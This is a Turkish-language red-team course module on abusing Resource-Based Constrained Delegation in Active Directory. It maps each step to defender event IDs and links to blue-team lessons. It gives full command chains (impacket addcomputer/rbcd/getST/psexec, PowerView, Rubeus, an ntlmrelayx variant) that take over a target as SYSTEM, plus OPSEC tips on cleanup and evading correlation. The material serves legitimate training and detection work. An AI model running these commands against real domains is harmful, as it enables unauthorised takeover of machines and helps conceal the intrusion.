## 1. Kavramsal Temel — Neden Var?

Klasik constrained delegation'ı ([06.2](./06.2_Constrained_Delegation_S4U.md)) yalnızca **Domain Admin** yapılandırabilir (`msDS-AllowedToDelegateTo` yazma yetkisi ayrıcalıklıdır). Microsoft, Windows 2012'de yönetimi **kaynak tarafına** devreden yeni bir model getirdi — ve bu, saldırgana devasa bir yükseltme yolu açtı:

> **RBCD'de "kim bana delege edebilir" kararı, delegasyonu YAPAN'da değil, kaynağın (hedef makinenin) kendisinde tutulur: `msDS-AllowedToActOnBehalfOfOtherIdentity`. Bu öznitelik hedef makine nesnesinin bir DACL'idir. Yani bir makine üzerinde SADECE GenericWrite'ın varsa (DA olman gerekmez!), bu özniteliğe KENDİ kontrol ettiğin bir hesabı yazarsın → artık o makinede istediğin kullanıcı (admin dahil) gibi bilet üretirsin.**

Bu, RBCD'yi **ACL abuse'un ([Modül 05](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/)) doğrudan kod-yürütmeye çevrildiği köprü** yapar: "makineye yazma hakkı" = "makineyi ele geçirme".

**Analoji:** Klasik delegation'da "kime güveneceğine" bina yönetimi (DA) karar veriyordu. RBCD'de her dairenin sahibi kendi "kimlerin benim adıma girebileceği" listesini tutuyor. O listeyi değiştirebiliyorsan (GenericWrite), kendini yazıp daireye istediğin kimlikle girersin.

## 2. Teknik Derinlik — RBCD Kurulumu ve S4U Zinciri

### 2.1 İki bileşen: kontrol edilen hesap + hedef öznitelik

```
   Gerekli 1: Bir SPN'li hesap (kontrolünde)
     → ya mevcut bir makine hesabı, YA DA sen bir tane yarat:
        MachineAccountQuota (varsayılan 10) → her kullanıcı 10 makine hesabı ekleyebilir!
        addcomputer.py → FAKE01$ / parola senin
   Gerekli 2: Hedef makinede GenericWrite (05.2)
     → hedefin msDS-AllowedToActOnBehalfOfOtherIdentity'sine FAKE01$'in SID'ini yaz
```

### 2.2 Kurulum sonrası S4U ile ele geçirme

```
   FAKE01$ (kontrolümde) ──S4U2Self+S4U2Proxy──▶ TARGET01 için "administrator" ST
   ┌──────────────────────────────────────────────────────────────────┐
   │ getST -spn CIFS/TARGET01 -impersonate administrator FAKE01$        │
   │  → administrator olarak CIFS/TARGET01 bileti                       │
   │  → psexec/wmiexec ile TARGET01'de SYSTEM                           │
   └──────────────────────────────────────────────────────────────────┘
```

### 2.3 MachineAccountQuota — RBCD'yi bu kadar erişilebilir yapan ayar

Varsayılan olarak **her domain kullanıcısı 10 makine hesabı oluşturabilir** (`ms-DS-MachineAccountQuota=10`). Bu, saldırgana "SPN'li, parolasını bildiğim bir hesap" üretmenin bedava yolunu verir — RBCD'nin 1. gereksinimini herhangi bir kullanıcı karşılar. Savunma bunu `0` yaparak keser ([Blue 06.1](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.1_Delegation_Envanteri_ve_Temizligi.md)); o zaman mevcut bir kontrollü SPN'li hesap gerekir.

> **RBCD ↔ Shadow Credentials sinerjisi:** Hedef makinede GenericWrite'ın varsa iki yol açıktır: (a) RBCD kur → S4U ile ele geçir, (b) Shadow Credentials ([05.4](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/05.4_Shadow_Credentials.md)) ekle → makine hash'i. AD CS varsa (b), yoksa (a) tercih edilir. İkisi de "makineye yazma = makineyi alma" ilkesinin uygulamasıdır.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Makine hesabı yarat (MAQ)

```bash
# Yeni makine hesabı ekle (parola senin) — MachineAccountQuota izin veriyorsa
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' \
  corp.local/jdoe:'Welcome1' -dc-ip 10.10.10.5
```

### 3.2 RBCD yaz (hedefin msDS-AllowedToActOnBehalfOf...)

```bash
# Impacket rbcd — FAKE01$'e TARGET01 üzerinde delegation ver
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET01$' -action write \
  corp.local/jdoe:'Welcome1' -dc-ip 10.10.10.5
```

```powershell
# PowerView (Windows) — SID'i doğrudan yaz
$sid = (Get-DomainComputer FAKE01).objectsid
Set-DomainRBCD -Identity TARGET01 -DelegateFrom $sid
```

```bash
# NetExec tek modül
nxc ldap 10.10.10.5 -u jdoe -p 'Welcome1' -M rbcd -o ACTION=write DELEGATE_TO=TARGET01$ DELEGATE_FROM=FAKE01$
```

### 3.3 S4U ile bileti al ve ele geçir

```bash
impacket-getST -spn CIFS/TARGET01.corp.local -impersonate administrator \
  -dc-ip 10.10.10.5 corp.local/'FAKE01$':'FakePass123!'
export KRB5CCNAME=administrator@CIFS_TARGET01.corp.local.ccache
impacket-psexec -k -no-pass corp.local/administrator@TARGET01.corp.local
```

**Örnek çıktı:**
```
[*] Delegation rights modified successfully!
[*] FAKE01$ can now impersonate users on TARGET01$ via S4U2Proxy
[*] Impersonating administrator → Saving ticket ... administrator@CIFS_TARGET01
C:\> whoami → nt authority\system     ← TARGET01 ele geçti
```

### 3.3.1 Rubeus ile Windows tarafı RBCD (uçtan uca)

```
:: 1) Makine hesabı yarat (Powermad)
New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'P!' -AsPlainText -Force)
:: 2) RBCD özniteliğini yaz (PowerView)
$sid = (Get-DomainComputer FAKE01).objectsid
Set-DomainRBCD -Identity TARGET01 -DelegateFrom $sid
:: 3) S4U ile bilet al
Rubeus.exe hash /password:'P!' /user:FAKE01$ /domain:corp.local   :: RC4/AES anahtarları
Rubeus.exe s4u /user:FAKE01$ /aes256:<key> /impersonateuser:administrator /msdsspn:CIFS/TARGET01 /ptt
```

### 3.4 Temizlik (izi kaldır)

```bash
impacket-rbcd -delegate-to 'TARGET01$' -action flush corp.local/jdoe:'Welcome1' -dc-ip 10.10.10.5
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| Makine hesabı oluşturma | **T1136.001** (Create Account) | **4741** (bilgisayar hesabı oluşturuldu) — kullanıcı tarafından | [Blue 06.1](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.1_Delegation_Envanteri_ve_Temizligi.md) |
| RBCD yazma | **T1098** / T1484 | **5136** — `msDS-AllowedToActOnBehalfOfOtherIdentity` değişti | [Blue 06.1](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.1_Delegation_Envanteri_ve_Temizligi.md) |
| S4U2Proxy abuse | **T1558.003** | 4769 Self+Proxy, Transited Services dolu | [Blue 06.4](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.4_Kerberos_Anomali_Izleme.md) |

**OPSEC notları:**
- **4741 (yeni bilgisayar hesabı)** bir *kullanıcı* tarafından oluşturulduğunda anormaldir — normalde makineler domain'e IT tarafından katılır. `FAKE01$` gibi hesaplar ([Blue 06.1](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.1_Delegation_Envanteri_ve_Temizligi.md)) izlenir. MachineAccountQuota=0 ise bu adım hiç yapılamaz; o zaman mevcut kontrollü SPN'li hesap kullan.
- **5136 üzerinde `msDS-AllowedToActOnBehalfOfOtherIdentity`** değişimi RBCD'nin en net imzasıdır. Bu öznitelik nadiren meşru değişir → yüksek-öncelikli alarm. İşi bitince **flush** ile temizle.
- **İz bırakan hesabı temizle:** `FAKE01$`'i engagement sonunda sil (`addcomputer -delete`), RBCD özniteliğini flush et. Kalıcı `FAKE01$` + RBCD = hem tespit hem kalıcılık borcu.
- **Adımlar korele olur:** 4741 (hesap) → 5136 (RBCD) → 4769 (S4U) ardışık zinciri bir "RBCD saldırısı" imzasıdır; savunmacı üçünü birleştirir. Zamana yaymak zincir korelasyonunu zorlaştırır ama tek tek olaylar yine görünür.

## 5. Doğrulama / Lab

```bash
# 1) Lab: jdoe'ya TARGET01 üzerinde GenericWrite ver (05.2). MAQ=10 (varsayılan).
# 2) addcomputer → FAKE01$, rbcd write, getST -impersonate administrator, psexec
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P!' corp.local/jdoe:'Welcome1'
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET01$' -action write corp.local/jdoe:'Welcome1'
impacket-getST -spn CIFS/TARGET01.corp.local -impersonate administrator corp.local/'FAKE01$':'P!'
# 3) Blue: 4741 + 5136 (AllowedToAct) + 4769 zincirini Get-WinEvent ile yakala
# 4) MAQ=0 yap → addcomputer başarısız olmalı (savunma etkisini gözle)
```

Atomic Red Team: **T1098 / T1136.001** → Blue doğrulaması [Blue 06.1](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.1_Delegation_Envanteri_ve_Temizligi.md).

### Gerçek-dünya RBCD zinciri (relay ile birleşim)

```
   1) mitm6/koersiyon (Modül 08) → WS042$ makine kimliğini ntlmrelayx ile LDAP'a relay
      ntlmrelayx -t ldaps://dc01 --delegate-access → RBCD'yi OTOMATİK kurar (FAKE01$→WS042)
   2) getST -spn CIFS/WS042 -impersonate administrator FAKE01$ → WS042'de admin bileti
   3) psexec → WS042'de SYSTEM → LSASS → yeni kimlikler
   İki yol: (a) elle GenericWrite→rbcd write, (b) relay→--delegate-access (kimlik doğrulamasız köprü).
```

### Ek: MAQ=0 iken RBCD (makine yaratmadan)

```
   MachineAccountQuota=0 ise addcomputer başarısız. Alternatifler:
   - Zaten kontrol ettiğin bir SPN'li hesap (ele geçirdiğin bir servis/makine) delegate-from olur
   - Shadow Credentials (05.4) ile bir makine hesabı ele geçir → onu delegate-from yap
   - Bir gMSA/servis hesabı SPN'i varsa ve hash'i elindeyse → delegate-from
   → RBCD'nin gerçek gereksinimi "SPN'li + anahtarını bildiğin hesap"; MAQ sadece kolay yol.
```
